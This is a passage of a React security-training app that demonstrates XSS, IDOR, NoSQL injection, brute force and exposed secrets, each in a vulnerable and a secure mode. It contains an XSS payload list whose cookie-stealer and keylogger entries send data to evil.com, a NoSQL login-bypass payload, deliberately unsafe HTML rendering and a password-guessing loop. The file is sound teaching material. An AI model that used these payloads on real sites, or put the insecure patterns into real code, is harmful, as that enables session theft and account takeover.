import React, { useState, useEffect, useCallback } from 'react';
import { AlertCircle, Shield, Lock, Unlock, User, Key, Database } from 'lucide-react';

// API helper for backend calls
const api = {
  async login(username, password) {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return res.json();
  },

  async register(username, password) {
    const res = await fetch('/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return res.json();
  },

  async logout() {
    const res = await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
    return res.json();
  },

  async getMe() {
    const res = await fetch('/api/auth/me', { credentials: 'include' });
    if (res.ok) return res.json();
    return null;
  },

  async getComments() {
    const res = await fetch('/api/comments', { credentials: 'include' });
    return res.json();
  },

  async postComment(text) {
    const res = await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ text })
    });
    return res.json();
  },

  async getSecrets() {
    const res = await fetch('/api/admin/secrets', { credentials: 'include' });
    if (res.ok) return res.json();
    return null;
  },

  // IDOR Demo APIs
  async getAllUsersVulnerable() {
    const res = await fetch('/api/vulnerable/users', { credentials: 'include' });
    return res.json();
  },

  async getAllUsersSecure() {
    const res = await fetch('/api/vulnerable/secure/users', { credentials: 'include' });
    return res.json();
  },

  async getUserByIdVulnerable(id) {
    const res = await fetch(`/api/vulnerable/users/${id}`, { credentials: 'include' });
    return res.json();
  },

  async getUserByIdSecure(id) {
    const res = await fetch(`/api/vulnerable/secure/users/${id}`, { credentials: 'include' });
    return res.json();
  },

  // Rate Limiting Demo APIs
  async bruteForceVulnerable(username, password) {
    const res = await fetch('/api/vulnerable/brute-force', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return res.json();
  },

  async bruteForceProtected(username, password) {
    const res = await fetch('/api/vulnerable/brute-force-protected', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return { ...(await res.json()), status: res.status };
  },

  // NoSQL Injection Demo APIs
  async noSqlInjectionDemo(username, password) {
    const res = await fetch('/api/vulnerable/login-demo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return res.json();
  },

  async noSqlInjectionSecure(username, password) {
    const res = await fetch('/api/vulnerable/login-secure', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });
    return { ...(await res.json()), status: res.status };
  }
};

function VulnerableSPADemo() {
  const [currentView, setCurrentView] = useState('home');
  const [user, setUser] = useState(null);
  const [loginForm, setLoginForm] = useState({ username: '', password: '' });
  const [registerForm, setRegisterForm] = useState({ username: '', password: '', confirmPassword: '' });
  const [comment, setComment] = useState('');
  const [comments, setComments] = useState([]);
  const [vulnerabilityMode, setVulnerabilityMode] = useState('vulnerable');
  const [exploitDemo, setExploitDemo] = useState('');
  const [loading, setLoading] = useState(true);
  const [secrets, setSecrets] = useState(null);

  // IDOR Demo State
  const [allUsers, setAllUsers] = useState([]);
  const [targetUserId, setTargetUserId] = useState('');
  const [idorResult, setIdorResult] = useState(null);

  // Rate Limiting Demo State
  const [bruteForceCount, setBruteForceCount] = useState(0);
  const [bruteForceResults, setBruteForceResults] = useState([]);
  const [isAttacking, setIsAttacking] = useState(false);

  // NoSQL Injection Demo State
  const [noSqlResult, setNoSqlResult] = useState(null);
  const [noSqlTarget, setNoSqlTarget] = useState('admin');

  // XSS Demo State
  const [xssInput, setXssInput] = useState('');
  const [xssPreview, setXssPreview] = useState('');

  // Fetch comments from backend
  const fetchComments = useCallback(async () => {
    try {
      const data = await api.getComments();
      if (data.success) {
        setComments(data.comments);
      }
    } catch (error) {
      console.error('Failed to fetch comments:', error);
    }
  }, []);

  // Check if user is logged in on mount
  useEffect(() => {
    const checkAuth = async () => {
      try {
        const data = await api.getMe();
        if (data?.success) {
          setUser(data.user);
          setCurrentView('dashboard');
        }
      } catch (error) {
        console.error('Auth check failed:', error);
      } finally {
        setLoading(false);
      }
    };
    checkAuth();
    fetchComments();
  }, [fetchComments]);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const result = await api.login(loginForm.username, loginForm.password);

      if (result.success) {
        if (vulnerabilityMode === 'vulnerable') {
          // VULNERABILITY: Also storing in localStorage for demo
          localStorage.setItem('authToken', btoa(JSON.stringify(result.user)));
          setExploitDemo('✅ Token stored in localStorage - Open DevTools > Application > Local Storage to see it!');
        }
        setUser(result.user);
        setCurrentView('dashboard');
        fetchComments();
      } else {
        alert(result.message || 'Login failed');
      }
    } catch (error) {
      console.error('Login error:', error);
      alert('Login failed. Please try again.');
    }
  };

  const handleLogout = async () => {
    try {
      await api.logout();
    } catch (error) {
      console.error('Logout error:', error);
    }
    localStorage.removeItem('authToken');
    setUser(null);
    setCurrentView('home');
  };

  const handleRegister = async (e) => {
    e.preventDefault();

    if (registerForm.password !== registerForm.confirmPassword) {
      alert('Passwords do not match!');
      return;
    }

    if (registerForm.password.length < 6) {
      alert('Password must be at least 6 characters!');
      return;
    }

    try {
      const result = await api.register(registerForm.username, registerForm.password);

      if (result.success) {
        setUser(result.user);
        setCurrentView('dashboard');
        setRegisterForm({ username: '', password: '', confirmPassword: '' });
        fetchComments();
      } else {
        alert(result.message || 'Registration failed');
      }
    } catch (error) {
      console.error('Register error:', error);
      alert('Registration failed. Please try again.');
    }
  };

  // VULNERABILITY 2: XSS - No input sanitization
  const handleCommentSubmit = async () => {
    if (!comment.trim()) return;

    try {
      const result = await api.postComment(comment);
      if (result.success) {
        // Refresh comments from backend to show the new one
        fetchComments();
        if (vulnerabilityMode === 'vulnerable') {
          setExploitDemo('⚠️ XSS Vulnerability! Try entering: <img src=x onerror="alert(\'XSS Attack!\')">');
        }
      } else {
        alert(result.message || 'Failed to post comment');
      }
    } catch (error) {
      console.error('Post comment error:', error);
      alert('Failed to post comment. Make sure you are logged in.');
    }
    setComment('');
  };

  // ============================================
  // IDOR DEMO HANDLERS
  // ============================================
  const fetchAllUsers = async (mode) => {
    try {
      const result = mode === 'vulnerable'
        ? await api.getAllUsersVulnerable()
        : await api.getAllUsersSecure();

      if (result.success) {
        setAllUsers(result.users);
        setIdorResult({ type: 'list', mode, ...result });
      }
    } catch (error) {
      console.error('Fetch users error:', error);
    }
  };

  const accessUserProfile = async (mode) => {
    if (!targetUserId.trim()) {
      alert('Please enter a user ID');
      return;
    }
    try {
      const result = mode === 'vulnerable'
        ? await api.getUserByIdVulnerable(targetUserId)
        : await api.getUserByIdSecure(targetUserId);
      setIdorResult({ type: 'access', mode, ...result });
    } catch (error) {
      console.error('Access user error:', error);
    }
  };

  // ============================================
  // RATE LIMITING DEMO HANDLERS
  // ============================================
  const simulateBruteForce = async (mode) => {
    setIsAttacking(true);
    setBruteForceResults([]);
    setBruteForceCount(0);

    const passwords = ['password', '123456', 'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'master'];
    const results = [];

    for (let i = 0; i < passwords.length; i++) {
      try {
        const result = mode === 'vulnerable'
          ? await api.bruteForceVulnerable('admin', passwords[i])
          : await api.bruteForceProtected('admin', passwords[i]);

        results.push({
          attempt: i + 1,
          password: passwords[i],
          ...result
        });
        setBruteForceResults([...results]);
        setBruteForceCount(i + 1);

        // Stop if rate limited
        if (result.blocked || result.status === 429) {
          break;
        }

        // Small delay between attempts
        await new Promise(resolve => setTimeout(resolve, 200));
      } catch (error) {
        console.error('Brute force error:', error);
      }
    }
    setIsAttacking(false);
  };

  // ============================================
  // NOSQL INJECTION DEMO HANDLERS
  // ============================================
  const tryNoSqlInjection = async (mode) => {
    try {
      // The injection payload that bypasses password check
      const injectionPayload = { "$gt": "" };

      const result = mode === 'vulnerable'
        ? await api.noSqlInjectionDemo(noSqlTarget, injectionPayload)
        : await api.noSqlInjectionSecure(noSqlTarget, injectionPayload);

      setNoSqlResult({ mode, ...result });
    } catch (error) {
      console.error('NoSQL injection error:', error);
    }
  };

  // ============================================
  // RENDER SECURITY DEMOS
  // ============================================

  // XSS Payload Library (safe for demo - no auto-execute)
  const xssPayloads = [
    { name: 'Script Tag', payload: "<script>alert('XSS')</script>", description: 'Classic script injection', severity: 'critical', icon: '💀' },
    { name: 'Image Error', payload: "<img src=x onerror=\"alert('XSS')\">", description: 'Event handler injection', severity: 'high', icon: '🖼️' },
    { name: 'SVG Onload', payload: "<svg onload=\"alert('XSS')\">", description: 'SVG event handler', severity: 'high', icon: '📐' },
    { name: 'Anchor Tag', payload: "<a href=\"javascript:alert('XSS')\">Click Me</a>", description: 'JavaScript protocol', severity: 'medium', icon: '🔗' },
    { name: 'Style Injection', payload: "<div style=\"background:url('javascript:alert(1)')\">Styled</div>", description: 'CSS-based XSS', severity: 'medium', icon: '🎨' },
    { name: 'Cookie Stealer', payload: "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">", description: 'Data exfiltration', severity: 'critical', icon: '🍪' },
    { name: 'Keylogger', payload: "<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>", description: 'Keystroke capture', severity: 'critical', icon: '⌨️' },
    { name: 'DOM Manipulation', payload: "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked!</h1>'\">", description: 'Page defacement', severity: 'high', icon: '💥' },
  ];

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'critical': return { bg: 'bg-red-500/20', border: 'border-red-500/50', text: 'text-white', glow: 'shadow-red-500/20' };
      case 'high': return { bg: 'bg-orange-500/20', border: 'border-orange-500/50', text: 'text-white', glow: 'shadow-orange-500/20' };
      case 'medium': return { bg: 'bg-yellow-500/20', border: 'border-yellow-500/50', text: 'text-white', glow: 'shadow-yellow-500/20' };
      default: return { bg: 'bg-gray-500/20', border: 'border-gray-500/50', text: 'text-white', glow: '' };
    }
  };

  const renderXSSDemo = () => (
    <div className="xss-demo-container">
      {/* Animated Header */}
      <div className="xss-header">
        <div className="xss-header-icon">
          <AlertCircle className="w-8 h-8 text-white" />
        </div>
        <div className="xss-header-content">
          <h3 className="text-2xl font-bold text-white mb-1">
            Cross-Site Scripting (XSS)
          </h3>
          <p className="text-red-200 text-sm">
            Inject malicious scripts into trusted websites to steal data, hijack sessions, or deface pages
          </p>
        </div>
        <div className="xss-threat-badge">
          <span className="xss-threat-pulse"></span>
          <span className="text-xs font-bold uppercase tracking-wider">OWASP Top 10</span>
        </div>
      </div>

      {/* Attack Vector Cards */}
      <div className="xss-types-grid">
        <div className="xss-type-card xss-type-stored">
          <div className="xss-type-icon">💾</div>
          <h4 className="xss-type-title">Stored XSS</h4>
          <p className="xss-type-desc">Persists in database. Executes for every victim who views the page.</p>
          <div className="xss-type-severity critical">CRITICAL</div>
        </div>
        <div className="xss-type-card xss-type-reflected">
          <div className="xss-type-icon">🔄</div>
          <h4 className="xss-type-title">Reflected XSS</h4>
          <p className="xss-type-desc">Payload in URL or form. Victim must click malicious link.</p>
          <div className="xss-type-severity high">HIGH</div>
        </div>
        <div className="xss-type-card xss-type-dom">
          <div className="xss-type-icon">🌐</div>
          <h4 className="xss-type-title">DOM-based XSS</h4>
          <p className="xss-type-desc">Client-side script unsafely uses user input to modify DOM.</p>
          <div className="xss-type-severity high">HIGH</div>
        </div>
      </div>

      {/* Payload Arsenal */}
      <div className="xss-arsenal">
        <div className="xss-arsenal-header">
          <h4 className="text-lg font-bold text-white flex items-center gap-2">
            <span className="text-2xl">🎯</span> Payload Arsenal
          </h4>
          <p className="text-gray-400 text-xs mt-1">Select a payload to test. Hover for details.</p>
        </div>

        <div className="xss-payload-grid">
          {xssPayloads.map((p, i) => {
            const colors = getSeverityColor(p.severity);
            return (
              <button
                key={i}
                onClick={() => { setXssInput(p.payload); setXssPreview(p.payload); }}
                className={`xss-payload-card ${colors.bg} ${colors.border} ${colors.glow}`}
                title={p.payload}
              >
                <span className="xss-payload-icon">{p.icon}</span>
                <span className="xss-payload-name">{p.name}</span>
                <span className={`xss-payload-severity ${colors.text}`}>
                  {p.severity.toUpperCase()}
                </span>
                <p className="xss-payload-desc">{p.description}</p>
              </button>
            );
          })}
        </div>
      </div>

      {/* Custom Payload Input */}
      <div className="xss-custom-input">
        <div className="xss-input-header">
          <span className="text-lg">⚡</span>
          <span className="text-white font-semibold">Custom Payload</span>
        </div>
        <div className="xss-input-wrapper">
          <div className="xss-input-prefix">&lt;script&gt;</div>
          <input
            type="text"
            value={xssInput}
            onChange={(e) => setXssInput(e.target.value)}
            placeholder="Enter your XSS payload here..."
            className="xss-input-field"
            onKeyPress={(e) => e.key === 'Enter' && setXssPreview(xssInput)}
          />
          <button
            onClick={() => setXssPreview(xssInput)}
            className="xss-inject-btn"
          >
            <span className="xss-inject-text">INJECT</span>
            <span className="xss-inject-icon">💉</span>
          </button>
        </div>
      </div>

      {/* Live Comparison */}
      {xssPreview && (
        <div className="xss-comparison animate-fadeIn">
          <div className="xss-comparison-header">
            <span className="text-xl">🔬</span>
            <h4 className="text-white font-bold">Live Comparison</h4>
          </div>

          <div className="xss-comparison-grid">
            {/* Vulnerable Output */}
            <div className="xss-result-card xss-result-vulnerable">
              <div className="xss-result-header">
                <div className="xss-result-status vulnerable">
                  <Unlock className="w-5 h-5" />
                  <span>VULNERABLE</span>
                </div>
                <span className="xss-result-badge danger">⚠️ EXPLOITABLE</span>
              </div>
              <div className="xss-result-code-label">
                <code>dangerouslySetInnerHTML</code>
                <span className="xss-warning-blink">●</span>
              </div>
              <div
                className="xss-result-output"
                dangerouslySetInnerHTML={{ __html: xssPreview }}
              />
              <div className="xss-result-info danger">
                <AlertCircle className="w-4 h-4" />
                <span>Script executes! Attacker gains control.</span>
              </div>
            </div>

            {/* Secure Output */}
            <div className="xss-result-card xss-result-secure">
              <div className="xss-result-header">
                <div className="xss-result-status secure">
                  <Lock className="w-5 h-5" />
                  <span>SECURE</span>
                </div>
                <span className="xss-result-badge success">✓ PROTECTED</span>
              </div>
              <div className="xss-result-code-label">
                <code>textContent / React JSX</code>
                <span className="xss-shield">🛡️</span>
              </div>
              <div className="xss-result-output secure">
                <code>{xssPreview}</code>
              </div>
              <div className="xss-result-info success">
                <Shield className="w-4 h-4" />
                <span>Script escaped! Rendered as harmless text.</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Prevention Guide */}
      <div className="xss-prevention">
        <div className="xss-prevention-header">
          <span className="text-2xl">🛡️</span>
          <h4 className="text-white font-bold text-lg">Defense Strategies</h4>
        </div>
        <div className="xss-prevention-grid">
          <div className="xss-prevention-item">
            <div className="xss-prevention-icon">🔒</div>
            <div className="xss-prevention-content">
              <h5>Output Encoding</h5>
              <p>Always encode data before rendering. Use <code>textContent</code> over <code>innerHTML</code>.</p>
            </div>
          </div>
          <div className="xss-prevention-item">
            <div className="xss-prevention-icon">🧹</div>
            <div className="xss-prevention-content">
              <h5>Input Sanitization</h5>
              <p>Use DOMPurify or similar libraries to sanitize HTML before insertion.</p>
            </div>
          </div>
          <div className="xss-prevention-item">
            <div className="xss-prevention-icon">📜</div>
            <div className="xss-prevention-content">
              <h5>CSP Headers</h5>
              <p>Implement Content Security Policy to restrict script sources.</p>
            </div>
          </div>
          <div className="xss-prevention-item">
            <div className="xss-prevention-icon">🍪</div>
            <div className="xss-prevention-content">
              <h5>HttpOnly Cookies</h5>
              <p>Prevent JavaScript access to sensitive cookies with HttpOnly flag.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderIDORDemo = () => (
    <div className="glass-card card-purple p-6">
      <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
        <Database className="w-5 h-5 text-purple-500" />
        <span className="text-purple-400">IDOR Demo</span>
        <span className="text-gray-400 text-sm font-normal">(Insecure Direct Object Reference)</span>
      </h3>
      <p className="text-sm text-gray-400 mb-4">
        IDOR occurs when an application exposes internal object IDs and doesn't verify if the user is authorized to access them.
      </p>

      <div className="space-y-4">
        {/* Current User Info */}
        <div className="glass-light p-3 rounded-lg">
          <p className="text-xs text-gray-500">Logged in as:</p>
          <p className="text-sm font-semibold text-purple-400">
            {user?.username} <span className="text-gray-400">({user?.role})</span>
          </p>
          <p className="text-xs text-gray-500 font-mono mt-1">ID: {user?.id}</p>
        </div>

        {/* List All Users Section */}
        <div className="border border-gray-600 rounded-lg p-4">
          <h4 className="text-sm font-semibold text-purple-300 mb-3">📋 List All Users</h4>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={() => fetchAllUsers('vulnerable')}
              className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 text-sm transition"
            >
              🔓 Vulnerable (No Check)
            </button>
            <button
              onClick={() => fetchAllUsers('secure')}
              className="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 text-sm transition"
            >
              🔒 Secure (Auth Check)
            </button>
          </div>
          <div className="mt-2 text-xs space-y-1">
            <p className="text-red-400">🔓 Vulnerable: Any user can list ALL users</p>
            <p className="text-green-400">🔒 Secure: Regular users see only their own profile, admins see all</p>
          </div>
        </div>

        {/* Access User by ID Section */}
        <div className="border border-gray-600 rounded-lg p-4">
          <h4 className="text-sm font-semibold text-purple-300 mb-3">👤 Access User by ID</h4>
          <div className="flex gap-2 flex-wrap mb-3">
            <input
              type="text"
              value={targetUserId}
              onChange={(e) => setTargetUserId(e.target.value)}
              placeholder="Enter user ID to access"
              className="flex-1 min-w-[200px] px-3 py-2 rounded-lg text-sm"
            />
          </div>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={() => accessUserProfile('vulnerable')}
              className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 text-sm transition"
            >
              🔓 Vulnerable Access
            </button>
            <button
              onClick={() => accessUserProfile('secure')}
              className="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 text-sm transition"
            >
              🔒 Secure Access
            </button>
          </div>
          <div className="mt-2 text-xs space-y-1">
            <p className="text-red-400">🔓 Vulnerable: Access ANY user's profile without authorization</p>
            <p className="text-green-400">🔒 Secure: Can only access your own profile (unless admin)</p>
          </div>
          {allUsers.length > 0 && (
            <div className="mt-3 p-2 bg-gray-800 rounded text-xs text-gray-300">
              <span className="font-semibold">Try accessing other users: </span>
              {allUsers.filter(u => u._id !== user?.id).slice(0, 3).map(u => (
                <button
                  key={u._id}
                  onClick={() => setTargetUserId(u._id)}
                  className="ml-2 px-2 py-1 bg-purple-500/20 text-purple-300 rounded hover:bg-purple-500/30 transition"
                >
                  {u.username}
                </button>
              ))}
            </div>
          )}
        </div>

        {idorResult && (
          <div className={`mt-4 p-4 rounded-lg text-sm ${idorResult.vulnerability ? 'alert-danger' : idorResult.secure ? 'alert-success' : 'glass-light'}`}>
            <pre className="whitespace-pre-wrap overflow-x-auto font-mono text-xs">{JSON.stringify(idorResult, null, 2)}</pre>
          </div>
        )}
      </div>
    </div>
  );

  const renderRateLimitDemo = () => (
    <div className="glass-card card-orange p-6">
      <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
        <AlertCircle className="w-5 h-5 text-orange-500" />
        <span className="text-orange-400">Rate Limiting Demo</span>
        <span className="text-gray-400 text-sm font-normal">(Brute Force Protection)</span>
      </h3>
      <p className="text-sm text-gray-400 mb-4">
        Without rate limiting, attackers can try unlimited password combinations until they find the right one.
      </p>

      <div className="flex gap-4 mb-4 flex-wrap">
        <button
          onClick={() => simulateBruteForce('vulnerable')}
          disabled={isAttacking}
          className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 text-sm disabled:opacity-50 transition"
        >
          {isAttacking ? '⏳ Attacking...' : '🔓 Attack (No Protection)'}
        </button>
        <button
          onClick={() => simulateBruteForce('secure')}
          disabled={isAttacking}
          className="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 text-sm disabled:opacity-50 transition"
        >
          {isAttacking ? '⏳ Attacking...' : '🔒 Attack (Rate Limited)'}
        </button>
      </div>

      {bruteForceResults.length > 0 && (
        <div className="terminal max-h-48 overflow-y-auto">
          <div className="terminal-header">
            <span className="terminal-dot terminal-dot-red"></span>
            <span className="terminal-dot terminal-dot-yellow"></span>
            <span className="terminal-dot terminal-dot-green"></span>
          </div>
          <div className="mb-2 text-gray-500">Brute Force Attack Simulation - Target: admin</div>
          {bruteForceResults.map((r, i) => (
            <div key={i} className={r.blocked ? 'text-red-500' : r.success ? 'text-green-500' : 'text-yellow-600'}>
              [{r.attempt}] Password: "{r.password}" → {r.blocked ? '🚫 BLOCKED' : r.success ? '✅ SUCCESS!' : '❌ Failed'}
              {r.vulnerability && <span className="text-gray-500"> (unprotected)</span>}
              {r.secure && <span className="text-gray-500"> (rate limited)</span>}
            </div>
          ))}
          {bruteForceResults[bruteForceResults.length - 1]?.blocked && (
            <div className="mt-2 text-cyan-400">🛡️ Rate limiting stopped the attack!</div>
          )}
        </div>
      )}
    </div>
  );

  const renderNoSQLInjectionDemo = () => (
    <div className="glass-card card-yellow p-6">
      <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
        <Key className="w-5 h-5 text-yellow-500" />
        <span className="text-yellow-400">NoSQL Injection Demo</span>
      </h3>
      <p className="text-sm text-gray-400 mb-4">
        NoSQL injection allows attackers to manipulate database queries by injecting operators like <code className="bg-gray-800 px-2 py-1 rounded text-yellow-400">{"$gt"}</code>, <code className="bg-gray-800 px-2 py-1 rounded text-yellow-400">{"$ne"}</code>.
      </p>

      <div className="glass-light p-4 rounded-lg mb-4">
        <p className="text-xs font-mono text-gray-400">
          <strong className="text-yellow-400">Injection Payload:</strong> {`{ "username": "${noSqlTarget}", "password": { "$gt": "" } }`}
        </p>
        <p className="text-xs text-gray-500 mt-2">
          The {"$gt: \"\""} operator means "greater than empty string" - always true, bypassing password validation!
        </p>
      </div>

      <div className="flex gap-4 items-center mb-4 flex-wrap">
        <label className="text-sm text-gray-400">Target user:</label>
        <input
          type="text"
          value={noSqlTarget}
          onChange={(e) => setNoSqlTarget(e.target.value)}
          className="px-3 py-2 rounded-lg text-sm w-32"
        />
        <button
          onClick={() => tryNoSqlInjection('vulnerable')}
          className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 text-sm transition"
        >
          🔓 Inject (Vulnerable)
        </button>
        <button
          onClick={() => tryNoSqlInjection('secure')}
          className="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 text-sm transition"
        >
          🔒 Inject (Sanitized)
        </button>
      </div>

      {noSqlResult && (
        <div className={`p-4 rounded-lg text-sm ${noSqlResult.bypassed ? 'alert-danger' : noSqlResult.blocked ? 'alert-success' : 'glass-light'}`}>
          {noSqlResult.bypassed && (
            <div className="text-red-500 font-bold mb-2">⚠️ Authentication Bypassed!</div>
          )}
          {noSqlResult.blocked && (
            <div className="text-green-500 font-bold mb-2">🛡️ Injection Attempt Blocked!</div>
          )}
          <pre className="whitespace-pre-wrap overflow-x-auto text-xs font-mono">{JSON.stringify(noSqlResult, null, 2)}</pre>
        </div>
      )}
    </div>
  );

  // Fetch admin secrets when user is admin
  useEffect(() => {
    const fetchSecrets = async () => {
      if (user?.role === 'admin') {
        const data = await api.getSecrets();
        if (data?.success) {
          setSecrets(data.secrets);
        }
      }
    };
    fetchSecrets();
  }, [user]);

  // VULNERABILITY 3: Insecure route - no proper authentication check
  const renderAdminPanel = () => {
    if (vulnerabilityMode === 'vulnerable') {
      // Vulnerable: Shows hardcoded secrets (in real vulnerable app these would be exposed)
      const demoSecrets = { apiKey: 'sk_live_51234567890abcdef', dbPassword: 'P@ssw0rd123!' };
      return (
        <div className="glass-card card-vulnerable p-6">
          <h3 className="text-xl font-bold text-red-500 mb-4 flex items-center gap-2">
            <Unlock className="w-5 h-5" />
            Admin Panel (Insecure)
          </h3>
          <div className="space-y-3">
            <div className="glass-light p-4 rounded-lg">
              <p className="font-semibold text-gray-600 text-sm">Secret API Keys:</p>
              <p className="font-mono text-sm text-red-400 break-all mt-1">{demoSecrets.apiKey}</p>
            </div>
            <div className="glass-light p-4 rounded-lg">
              <p className="font-semibold text-gray-600 text-sm">Database Password:</p>
              <p className="font-mono text-sm text-red-400 mt-1">{demoSecrets.dbPassword}</p>
            </div>
            <div className="alert-danger mt-4">
              <p className="text-sm">
                ⚠️ This data is exposed on client-side! Anyone can access it via browser console.
              </p>
            </div>
          </div>
        </div>
      );
    } else {
      // Secure: Backend validates authentication before sending sensitive data
      if (user?.role !== 'admin') {
        return <div className="glass-card p-6 text-gray-500">Access Denied</div>;
      }
      return (
        <div className="glass-card card-secure p-6">
          <h3 className="text-xl font-bold text-green-500 mb-4 flex items-center gap-2">
            <Lock className="w-5 h-5" />
            Admin Panel (Secured)
          </h3>
          {secrets ? (
            <div className="space-y-3">
              <div className="alert-success mb-4">
                <p>✅ Data fetched securely from backend</p>
              </div>
              <div className="glass-light p-4 rounded-lg">
                <p className="font-semibold text-gray-600 text-sm">Secret API Key:</p>
                <p className="font-mono text-sm text-green-400 break-all mt-1">{secrets.apiKey}</p>
              </div>
              <div className="glass-light p-4 rounded-lg">
                <p className="font-semibold text-gray-600 text-sm">Database Password:</p>
                <p className="font-mono text-sm text-green-400 mt-1">{secrets.dbPassword}</p>
              </div>
            </div>
          ) : (
            <p className="text-green-400">Backend validates authentication before sending sensitive data.</p>
          )}
        </div>
      );
    }
  };

  const renderHome = () => (
    <div className="space-y-8 animate-fadeIn">
      <div className="text-center mb-8">
        <div className="hero-icon mx-auto mb-6">
          <Shield className="w-12 h-12 text-white" />
        </div>
        <h1 className="hero-title">SPA Security Demo</h1>
        <p className="hero-subtitle">Interactive demonstration of security vulnerabilities in Single Page Applications</p>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        <div className="glass-card card-vulnerable p-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3 flex items-center gap-2">
            <AlertCircle className="w-5 h-5 text-red-500" />
            <span className="gradient-text" style={{ background: 'linear-gradient(135deg, #ef4444, #f97316)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Vulnerable Mode</span>
          </h3>
          <ul className="space-y-2 text-sm text-gray-600">
            <li className="flex items-center gap-2"><span className="text-red-400">•</span> XSS attacks possible</li>
            <li className="flex items-center gap-2"><span className="text-red-400">•</span> JWT stored in localStorage</li>
            <li className="flex items-center gap-2"><span className="text-red-400">•</span> Insecure routing</li>
            <li className="flex items-center gap-2"><span className="text-red-400">•</span> API secrets exposed</li>
          </ul>
        </div>

        <div className="glass-card card-secure p-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3 flex items-center gap-2">
            <Shield className="w-5 h-5 text-green-500" />
            <span className="gradient-text" style={{ background: 'linear-gradient(135deg, #10b981, #22d3ee)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Secure Mode</span>
          </h3>
          <ul className="space-y-2 text-sm text-gray-600">
            <li className="flex items-center gap-2"><span className="text-green-400">•</span> Input sanitization</li>
            <li className="flex items-center gap-2"><span className="text-green-400">•</span> HttpOnly cookies</li>
            <li className="flex items-center gap-2"><span className="text-green-400">•</span> Backend auth validation</li>
            <li className="flex items-center gap-2"><span className="text-green-400">•</span> CSP headers</li>
          </ul>
        </div>
      </div>

      <div className="flex justify-center mt-8">
        <button
          onClick={() => setCurrentView('login')}
          className="px-8 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition text-lg font-semibold animate-pulse-glow"
        >
          🚀 Try Demo
        </button>
      </div>
    </div>
  );

  const renderLogin = () => (
    <div className="max-w-md mx-auto animate-fadeIn">
      <div className="glass-card p-8">
        <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center flex items-center justify-center gap-2">
          <div className="p-2 bg-blue-600 rounded-lg">
            <User className="w-5 h-5 text-white" />
          </div>
          <span className="gradient-text">Login</span>
        </h2>

        <form onSubmit={handleLogin} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-600 mb-2">Username</label>
            <input
              type="text"
              value={loginForm.username}
              onChange={(e) => setLoginForm({ ...loginForm, username: e.target.value })}
              className="w-full px-4 py-3 rounded-lg"
              placeholder="Enter your username"
              required
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-600 mb-2">Password</label>
            <input
              type="password"
              value={loginForm.password}
              onChange={(e) => setLoginForm({ ...loginForm, password: e.target.value })}
              className="w-full px-4 py-3 rounded-lg"
              placeholder="Enter your password"
              required
            />
          </div>

          <button
            type="submit"
            className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-semibold text-lg mt-2"
          >
            Login
          </button>
        </form>

        <div className="mt-6 text-center">
          <p className="text-gray-500 text-sm">
            Don't have an account?{' '}
            <button
              onClick={() => setCurrentView('register')}
              className="text-blue-600 hover:text-blue-800 font-medium"
            >
              Register here
            </button>
          </p>
        </div>
      </div>
    </div>
  );

  const renderRegister = () => (
    <div className="max-w-md mx-auto animate-fadeIn">
      <div className="glass-card p-8">
        <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center flex items-center justify-center gap-2">
          <div className="p-2 bg-green-600 rounded-lg">
            <User className="w-5 h-5 text-white" />
          </div>
          <span className="gradient-text" style={{ background: 'linear-gradient(135deg, #10b981, #22d3ee)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Create Account</span>
        </h2>

        <form onSubmit={handleRegister} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-600 mb-2">Username</label>
            <input
              type="text"
              value={registerForm.username}
              onChange={(e) => setRegisterForm({ ...registerForm, username: e.target.value })}
              className="w-full px-4 py-3 rounded-lg"
              placeholder="At least 3 characters"
              minLength={3}
              required
            />
          </div>

          <div>
